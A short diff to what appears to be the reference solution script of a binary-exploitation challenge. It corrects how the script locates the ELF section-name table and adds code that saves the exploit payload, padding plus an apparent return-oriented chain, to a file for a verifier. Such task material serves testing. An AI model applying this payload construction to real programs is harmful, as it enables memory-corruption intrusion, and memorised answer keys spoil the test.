@@ -56,7 +56,9 @@ def text_bytes():
         o = struct.unpack_from("<Q", data, off + 0x18)[0]
         size = struct.unpack_from("<Q", data, off + 0x20)[0]
         secs.append((name, addr, o, size))
-    so, _, _, _ = secs[shstr]
+    # shstr is the section-header INDEX of the section-name string table;
+    # its file offset is the 'o' field of that section header.
+    _, _, so, _ = secs[shstr]
     for name, addr, o, size in secs:
         end = data.index(b"\x00", so + name)
         nm = data[so + name:end].decode('utf-8', 'replace')
@@ -116,6 +118,9 @@ def main():
     if got != EXPECT:
         raise SystemExit("oracle could not produce the flag")
     print("flag content OK:", got)
+    # Deliverable: persist the winning payload for the verifier.
+    with open("/app/payload.bin", "wb") as f:
+        f.write(b"A" * off + chain)
 
 
 if __name__ == "__main__":
